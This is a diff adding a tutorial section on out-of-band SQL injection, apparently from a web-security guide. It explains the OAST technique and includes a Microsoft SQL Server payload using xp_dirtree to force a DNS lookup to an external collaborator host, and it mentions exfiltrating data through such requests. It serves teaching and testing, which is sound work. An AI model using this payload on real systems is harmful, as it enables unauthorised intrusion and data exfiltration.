@@ -186,3 +186,35 @@ WAITFOR DELAY '0:0:10'--
 If the response is delayed, the tested condition is true.
 
 The exact syntax used to trigger time delays depends on the database system.
+
+### Out-of-band (OAST) SQL injection
+
+Some blind SQL injection vulnerabilities provide no observable difference in the HTTP response.
+
+This can happen when the vulnerable SQL query is executed asynchronously. In this situation:
+
+- Query results are not visible.
+- Database errors do not affect the response.
+- Time delays do not delay the original HTTP response.
+
+An alternative is to trigger an external network interaction from the database to a system controlled by the tester. This technique is known as out-of-band application security testing (OAST).
+
+DNS is particularly useful because outbound DNS traffic is commonly allowed by production networks.
+
+For example, on Microsoft SQL Server:
+
+```text
+'; exec master..xp_dirtree '//example.burpcollaborator.net/a'--
+```
+
+can cause the database server to perform a DNS lookup for:
+
+```text
+example.burpcollaborator.net
+```
+
+If the external server receives this lookup, it confirms that the injected SQL was executed.
+
+Out-of-band techniques can also sometimes include sensitive data directly inside the generated network request, allowing information to be exfiltrated without extracting it through HTTP responses one character at a time.
+
+The exact technique used to generate external interactions depends on the database system.
